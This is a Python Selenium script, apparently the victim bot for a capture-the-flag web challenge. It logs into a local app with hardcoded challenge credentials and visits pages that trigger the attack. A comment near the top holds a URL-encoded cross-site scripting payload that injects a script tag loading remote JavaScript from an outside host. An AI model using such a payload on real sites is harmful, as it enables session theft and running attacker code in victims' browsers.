import signal
from selenium import webdriver
from collections import defaultdict
from selenium import webdriver
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import os

# payload for dropping the script
# http://localhost:5000/products?currency=AUD-%3Cscript%3E$(%27body%27).append(%27%3Cscript%20src=%22http://shittyctf.xyz/x.js%22%20async%3E%27);%3C/script%3E-false

protocol = 'http://'
page = "localhost:5000"
login_url = "/user/sign-in"
username = 'pokechampion'
password = 'dontyoulovelongpasswords'

def send(field, data):
    driver.find_element_by_xpath(field).clear()
    driver.find_element_by_xpath(field).send_keys(data)

def click(field):
    driver.find_element_by_xpath(field).click()

def force_click(field):
    element = driver.find_element_by_xpath(field)
    ActionChains(driver).move_to_element(element).click().perform()

def login():
    print '[+] Starting login'
    xpaths = {  "username":"//input[@id='username']",
                "password":"//input[@id='password']",
                "submit":"//input[@type='submit']"}
    driver.get(protocol + page + login_url)
    send(xpaths['username'], username)
    send(xpaths['password'], password)
    click(xpaths['submit'])

def get_payload():
    print '[+] Fetching Payload'
    xpaths = { "url":"//a" }
    driver.get(protocol + page + '/livingdead')
    try:
        click(xpaths['url'])
    except:
        print '[-] Timeout on clicking url'
        pass

def main():
    global driver
    print '[+] Starting pyBot'
    driver = webdriver.PhantomJS()
    #driver = webdriver.Chrome()
    driver.set_page_load_timeout(5)
    driver.set_window_size(1024, 768)
    login()
    get_payload()
    driver.get(protocol + page + '/secretpassage')
    print '[+] Finished successfully'
    driver.service.process.send_signal(signal.SIGTERM)
    driver.quit()

if __name__ == '__main__':
    main()
